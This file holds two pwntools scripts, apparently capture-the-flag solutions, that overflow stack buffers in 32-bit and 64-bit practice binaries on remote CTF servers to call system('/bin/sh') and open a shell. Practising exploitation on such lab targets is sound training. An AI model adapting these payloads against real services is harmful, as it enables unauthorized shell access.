32:
from pwn import * 
elf=ELF("./dasctf_sixbytes")
io=remote('dasctf_sixbytes.challenge.ctf.show',28111)
bin_sh=0x4006E6
system_addr=0x40058E
payload=(b'a'*0x10)+(b'a'*4)+p32(system_addr)+b'aaaa'+p32(bin_sh)
io.sendlineafter("Hello Hacker!\n",payload)
io.interactive()
64:
from pwn import *
elf=ELF("./level2_x64")
io =remote("node4.buuoj.cn",28817)
bin_sh=0x600A90
system_addr=0x40063E
pop_rdi=0x4006b3
ret=0x4004a1
payload=(b'a'*0x80)+(b'a'*8)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)
io.sendlineafter("Input:\n",payload)
io.interactive()